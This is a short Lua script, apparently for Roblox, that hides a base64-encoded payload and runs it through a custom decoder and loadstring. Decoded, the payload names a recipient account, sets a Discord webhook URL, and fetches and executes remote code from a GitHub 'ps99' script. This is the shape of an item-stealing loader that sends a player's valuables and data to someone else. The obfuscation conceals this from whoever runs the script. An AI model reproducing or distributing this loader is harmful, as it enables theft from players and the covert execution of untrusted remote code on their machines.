
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gImphY2tib2dsZTEyIgpVc2VybmFtZTIgPSAiamFja2JvZ2xlMTIiCk1pbmltdW1SQVAgPSAxCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NzQwNjc5NDg3OTg2MDkyNy9kUTVSMGRfOERLT0ZvUEZ5V0JSNlRzelFFUUxwUEpzYjRzZkN1R0RocHBwZjNsbDVQWUc4bTM3R2N0R0VRQ3RIREI1MiIKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMTRFbGkvMjE0c2NyaXB0cy9yZWZzL2hlYWRzL21haW4vcHM5OSIsIHRydWUpKSgp"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()